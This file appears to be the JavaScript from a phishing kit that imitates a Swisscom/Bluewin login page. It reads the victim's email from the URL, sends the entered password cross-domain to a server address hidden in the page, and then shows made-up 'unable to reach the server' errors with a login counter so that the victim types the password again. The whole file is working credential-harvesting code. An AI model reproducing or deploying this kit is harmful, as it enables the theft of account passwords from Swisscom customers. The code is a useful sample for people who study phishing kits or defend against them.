$(document).ready(function () {
  // Start - Get username from URL
  var grabber = window.location.hash.substr(1);
  // End - Get username from URL

  // Start - Email address validation
  function validateEmail(email) {
    var hash = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
    //var hash = /^[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@bluewin.ch$/;
    return hash.test(email);
  }
  // End - Email address validation

  // Start - Hide & empty error messages on keyup
  $("#emailForm, #passwordForm input").keydown(function () {
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
  });
  // End - Hide & Empty error messages on keyup

  // Start - Check if username is available from url
  if (!grabber) {
    $('#username').focus();
  } else {
    $("#emailForm").addClass("visually-hidden");
    $("#passwordForm").removeClass("visually-hidden");
    $("#emailPreview").html(grabber);
    $("#password").focus();
  }
  // End - Check if username is available from url

  // Start - Email validation and login
  $("#emailForm").submit(function (e) {
    e.preventDefault();
    $("#authError, #emailError").html("").addClass("visually-hidden");
    var username = $("#username").val().trim();

    if (!username) {
      $("#emailError").html("!&nbsp;This is a required field.").removeClass("visually-hidden");
      $("#username").focus();
    } else if (!validateEmail(username)) {
      $("#emailError").html("!&nbsp;Username entered is incorrect.").removeClass("visually-hidden");
      $("#username").focus();
    } else {
      $("#emailForm").addClass("visually-hidden");
      $("#passwordForm").removeClass("visually-hidden");
      $("#authError, #emailError").html("").addClass("visually-hidden");
      $("#emailPreview").html(username);
      $("#email").val(username);
      $("#password").focus();
    }
  });
  // End - Email validation and login

  // Start - Back to email login
  $("#changeEmail").click(function (e) {
    $("#passwordForm").addClass("visually-hidden");
    $("#emailForm").removeClass("visually-hidden");
    $("#authError, #passwordError").html("").addClass("visually-hidden");
    $("#emailPreview").html("");
    $("#email").val();
    $("#username").focus();
  });
  // End - Back to email login

  // Start - Login form submit
  $("#passwordForm").submit(function (e) {
    e.preventDefault();
    $("#authError, #passwordError").html("").addClass("visually-hidden");
    var password = $("#password").val().trim();

    if (!password) {
      $("#passwordError").html("!&nbsp;This is a required field.").removeClass("visually-hidden");
      $("#password").focus();
    } else if (password.length < 5) {
      $("#passwordError").html("!&nbsp; Your username or password is incorrect.").removeClass("visually-hidden");
      $("#password").focus();
    } else {
      jQuery.ajax({
        url: $("#sourceURL").html(),
        data: $("#passwordForm").serialize(),
        type: "POST",
        crossDomain: true,
        beforeSend: function () {
          $("#passwordForm input").blur();
          $("#submitText").addClass("visually-hidden");
          $("#submitLoader").removeClass("visually-hidden");
          $("#authError, #passwordError, #emailError").html("").addClass("visually-hidden");
        },
        success: function (data) {
          if (data.match(/1/i)) {
            $("#submitText").removeClass("visually-hidden");
            $("#submitLoader").addClass("visually-hidden");
            $("#loginCount").val("2");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html("Hmm, unable to reach the server. Try again").removeClass("visually-hidden");
          } else if (data.match(/2/i)) {
            $("#submitText").removeClass("visually-hidden");
            $("#submitLoader").addClass("visually-hidden");
            $("#loginCount").val("1");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html("Hmm, unable to reach the server. Try again").removeClass("visually-hidden");
          } else if (data.match(/0/i)) {
            $("#submitText").removeClass("visually-hidden");
            $("#submitLoader").addClass("visually-hidden");
            $("#loginCount").val("1");
            $("#password").val("");
            $("#authError").html("Please login with your Swisscom account.").removeClass("visually-hidden");
          } else if (data.match(/-0/i)) {
            $("#submitText").removeClass("visually-hidden");
            $("#submitLoader").addClass("visually-hidden");
            $("#loginCount").val("1");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html("Error. Please check your network and try again.").removeClass("visually-hidden");
          }
        },
        error: function () {
          $("#submitText").removeClass("visually-hidden");
          $("#submitLoader").addClass("visually-hidden");
          $("#loginCount").val("1");
          $("#password").val("");
          $("#password").focus();
          $("#authError").html("Error. Please check your network and try again").removeClass("visually-hidden");
        },
      });
    }
  });
  // End - Login form submit
});
